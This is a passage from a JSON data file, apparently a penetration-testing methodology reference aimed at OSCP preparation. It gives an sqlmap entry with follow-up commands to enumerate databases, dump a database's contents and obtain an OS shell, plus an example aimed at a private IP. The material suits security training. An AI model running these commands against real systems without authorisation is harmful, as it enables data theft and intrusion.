      ],
      "prerequisites": [
        "gobuster-dir",
        "sqli-manual-test"
      ],
      "notes": "Save Burp request to file for complex requests",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "Enumerate databases: sqlmap -u '<URL>' --dbs Dump specific database: sqlmap -u '<URL>' -D <DATABASE> --dump Get shell: sqlmap -u '<URL>' --os-shell Try different techniques: sqlmap -u '<URL>' --technique=U"
      },
      "filled_example": "sqlmap -u 'http://192.168.1.100/page.php?id=1' --batch --banner"
